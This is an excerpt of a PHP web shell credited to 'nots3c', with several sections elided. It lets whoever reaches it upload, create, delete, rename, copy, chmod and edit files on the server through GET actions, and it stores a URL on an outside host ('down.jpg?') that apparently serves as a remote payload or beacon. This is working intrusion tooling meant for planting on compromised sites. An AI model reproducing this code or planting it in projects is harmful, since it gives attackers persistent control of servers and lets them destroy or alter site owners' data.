...
<center>
  <span class="style1">by nots3c</span>
</center>
...
<?php
 ...
 $mhost = 'http://www.education.zp.ua/images/down.jpg?';
...
if (@$_GET['action'] == 'upload') {
 ...
 if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $_FILES['userfile']['name'])) {
  $msg = "<font color=\"#008000\"><font color=\"#FFFFFF\">{$_FILES['userfile']['name']}</font>,&nbsp;the&nbsp;archive&nbsp;is&nbsp;validates&nbsp;and&nbsp;was&nbsp;loaded&nbsp;successfully.</font>";
 } else {
...
elseif (@$_GET['action'] == 'mkdir') {
    ...
    if (@mkdir("$chdir"."$newdir")) {
     $msg = "<font color=\"#008000\"><font color=\"#FFFFFF\">{$newdir}</font>,&nbsp;directory&nbsp;created successfully.</font>";
    } else {
...
elseif (@$_GET['action'] == 'newfile') {
    ...
    if (@touch("$chdir"."$newfile")) {
     $msg = "<font color=\"#008000\"><font color=\"#FFFFFF\">{$newfile}</font>,&nbsp;created successfully!</font>";
    } else {
...
elseif (@$_GET['action'] == 'del') {
     ...
     if ($type == 'file') {
      if (@unlink("$chdir"."$file")) {
       $msg = "<font color=\"#008000\"><font color=\"#FFFFFF\">{$file}</font>,&nbsp;successfully&nbsp;excluded&nbsp;archive!</font>";
      } else {
         $msg = "<font color=\"#FF0000\">Error&nbsp;to&nbsp;it&nbsp;I&nbsp;excluded&nbsp;archive!</font>";
        }
     } elseif ($type == 'dir') {
        if (@rmdir("$chdir"."$file")) {
          $msg = "<font color=\"#008000\"><font color=\"#FFFFFF\">{$file}</font>,&nbsp;successfully&nbsp;excluded&nbsp;directory!</font>";
        } else {
...
elseif (@$_GET['action'] == 'chmod') {
     ...
     if (@chmod ("$file", $chmod)) {
      ...
      $msg = "<font color=\"#008000\">Chmod&nbsp;of</font>&nbsp;<font color=\"#FFFFFF\">{$_GET['file']}</font>&nbsp;<font color=\"#008000\">moved&nbsp;for</font>&nbsp;<font color=\"#FFFFFF\">$chmod</font>&nbsp;<font color=\"#008000\">successfully.</font>";
     } else {
...
elseif (@$_GET['action'] == 'rename') {
     ...
     if (@rename("$chdir"."$file", "$chdir"."$newname")) {
      $msg = "<font color=\"#008000\">Archive</font>&nbsp;<font color=\"#FFFFFF\">{$file}</font>&nbsp;<font color=\"#008000\">named for</font>&nbsp;<font color=\"#FFFFFF\">{$newname}</font>&nbsp;<font color=\"#008000\">successfully!</font>";
     } else {
...
elseif (@$_GET['action'] == 'copy') {
    ...
    if (@copy("$file", "$copy")) {
     $msg = "<font color=\"#FFFFFF\">{$file}</font>,&nbsp;<font color=\"#008000\">copied for</font> <font color=\"#FFFFFF\">{$copy}</font> <font color=\"#008000\">successfully!</font>";
    } else {
...
elseif (@$_GET['action'] == 'save') {
   ...
   if (is_writable($filename)) {
    ...
    @fclose($handle);
    if ($handle && $fw) {
     $msg = "<font color=\"#FFFFFF\">{$_GET['file']}</font>,&nbsp;<font color=\"#008000\">edited&nbsp;successfully!</font>";
    }
 } else {
...
$colorn = 0;
    while (false !== ($file = readdir($handle))) {
        if ($file != '.') {
            if ($colorn == 0) {
             $color = "style=\"background-color: #666666\"";
            }
            elseif ($colorn == 1) {
